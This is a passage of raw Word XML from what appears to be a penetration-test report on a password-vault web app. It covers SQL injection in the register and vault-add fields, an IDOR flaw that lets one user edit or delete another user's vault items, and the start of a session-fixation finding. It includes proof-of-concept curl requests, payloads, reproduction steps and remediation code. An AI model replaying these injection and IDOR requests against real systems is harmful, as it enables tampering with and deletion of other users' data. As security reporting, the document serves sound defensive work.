      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/register \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"test' OR '1'='1","password":"Password123!"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"message":"Registration successful!","success":true}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 2: SQL Injection - Vault Add Title Field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HIGH (CVSS 8.6)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The vault add endpoint accepts unsanitized user input in the title field, allowing SQL injection attacks. An attacker can inject SQL commands to manipulate vault data or potentially extract database information.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoint:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /vault/add</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Parameter:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vaulttitle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Type:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SQL Injection (Boolean-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication Required:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Yes (session-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Request:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/vault/add \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"vaulttitle":"test' OR '1'='1","vaultusername":"test","vaultpassword":"test123"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"success":true,"message":"Item added successfully!"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vault Item Created:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Title </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>test' OR '1'='1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> successfully stored and displayed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Vault item creation with SQL payloads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Potential database manipulation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Data integrity compromise</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 8.6 (High)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Parameterized Queries:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   // Vulnerable</w:t>
        <w:br/>
        <w:t xml:space="preserve">   db.query("INSERT INTO vault (title, username, password, user_id) VALUES ('" + title + "', ...);</w:t>
        <w:br/>
        <w:t xml:space="preserve">   </w:t>
        <w:br/>
        <w:t xml:space="preserve">   // Secure</w:t>
        <w:br/>
        <w:t xml:space="preserve">   db.query("INSERT INTO vault (title, username, password, user_id) VALUES (?, ?, ?, ?)", [title, username, password, userId]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Input Validation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sanitize all user inputs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reject special SQL characters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce field length limits</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use ORM Frameworks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the application with valid credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Navigate to the vault page (/vault).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Unlock the vault by entering your account password and clicking "Unlock".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Click the "Add Item" button in the vault section.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">5. In the title field, enter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">6. In username field, enter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">7. In password field, enter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>test123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Click "Add Item".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Observe success alert: "Item added successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Verify the item appears in the vault list with the injected title.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Vault add form with SQL payload in title field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Successful vault item creation response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Vault display showing item with injected title</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/vault/add \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"vaulttitle":"test' OR '1'='1","vaultusername":"test","vaultpassword":"test123"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"success":true,"message":"Item added successfully!"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 3: Insecure Direct Object Reference (IDOR) - Vault Edit Endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HIGH (CVSS 8.1)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The vault edit and delete endpoints fail to properly validate user authorization. An authenticated user can modify or delete vault items belonging to other users by directly specifying the target item ID in the URL. The application does not verify that the authenticated user owns the vault item before allowing modifications or deletions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoints:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PUT /vault/edit/:itemId, DELETE /vault/delete/:itemId</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Parameter:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> itemId (URL path)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Type:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Broken Object Level Authorization (BOLA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication Required:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Yes (session-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 1: Identify Target Item ID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>From vault display, note item IDs belonging to other users (e.g., item ID 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 2: Modify Another User's Item (Edit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X PUT http://10.0.0.10/vault/edit/1 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"vaulttitle":"updated title from other acc vault","vaultusername":"hacked","vaultpassword":"hacked"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 3: Delete Another User's Item (Delete)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X DELETE http://10.0.0.10/vault/delete/1 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerable Response (Edit):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"success":true,"message":"Item updated successfully!"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerable Response (Delete):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Item deleted successfully</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Item ID 1 (belonging to another user) was successfully modified/deleted without authorization check. Vault display now shows the modified/deleted credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unauthorized modification or deletion of other users' vault items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Credential corruption, data loss, and data integrity compromise</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Complete compromise of other users' stored data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Potential for account lockout or data destruction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 8.1 (High)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Authorization Checks:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   // Vulnerable</w:t>
        <w:br/>
        <w:t xml:space="preserve">   app.put('/vault/edit/:itemId', (req, res) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     const itemId = req.params.itemId;</w:t>
        <w:br/>
        <w:t xml:space="preserve">     db.query("UPDATE vault SET title = ? WHERE id = ?", [req.body.vaulttitle, itemId]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">   // Secure</w:t>
        <w:br/>
        <w:t xml:space="preserve">   app.put('/vault/edit/:itemId', (req, res) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     const itemId = req.params.itemId;</w:t>
        <w:br/>
        <w:t xml:space="preserve">     const userId = req.session.userId;</w:t>
        <w:br/>
        <w:t xml:space="preserve">     </w:t>
        <w:br/>
        <w:t xml:space="preserve">     // Verify item belongs to authenticated user</w:t>
        <w:br/>
        <w:t xml:space="preserve">     const item = db.query("SELECT * FROM vault WHERE id = ? AND user_id = ?", [itemId, userId]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">     if (!item) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">       return res.status(403).json({ success: false, message: "Unauthorized" });</w:t>
        <w:br/>
        <w:t xml:space="preserve">     }</w:t>
        <w:br/>
        <w:t xml:space="preserve">     </w:t>
        <w:br/>
        <w:t xml:space="preserve">     db.query("UPDATE vault SET title = ? WHERE id = ? AND user_id = ?", [req.body.vaulttitle, itemId, userId]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verify Ownership Before Operations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Role-Based Access Control (RBAC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add Audit Logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login as victim user, navigate to vault, add an item (note the item ID from the edit link, e.g., /vault/edit/1) use Burp Suite to intercept traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Logout or use incognito mode to login as attacker user.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>As attacker, click on edit button to edit your own item and capture the request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Attempt to edit your own item by modifying the PUT request to /vault/edit/1 (your ID), change data, forward, observe success.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Alternatively, send DELETE request to /vault/delete/1 (target item ID), observe "Item deleted successfully" - note that the same IDOR allows deleting other users' items.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login back as victim, verify the item has been modified or deleted.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Original vault item belonging to another user</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IDOR request modifying item ID of another user (edit or delete)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Successful update/delete response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Modified/deleted vault item in victim's vault</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Edit IDOR</w:t>
        <w:br/>
        <w:t>curl -X PUT http://10.0.0.10/vault/edit/1 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[attacker_session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"vaulttitle":"hacked title","vaultusername":"hacked","vaultpassword":"hacked"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"success":true,"message":"Item updated successfully!"}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Delete IDOR</w:t>
        <w:br/>
        <w:t>curl -X DELETE http://10.0.0.10/vault/delete/1 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[attacker_session]"</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: Item deleted successfully</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 4: Broken Authentication - Session Fixation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MEDIUM (CVSS 5.4)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application suffers from Session Fixation vulnerability. Old session cookies remain valid after user login, allowing attackers to maintain persistent access to user accounts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoints:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /login, GET /vault</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Issue:</w:t>
      </w:r>
      <w:r>
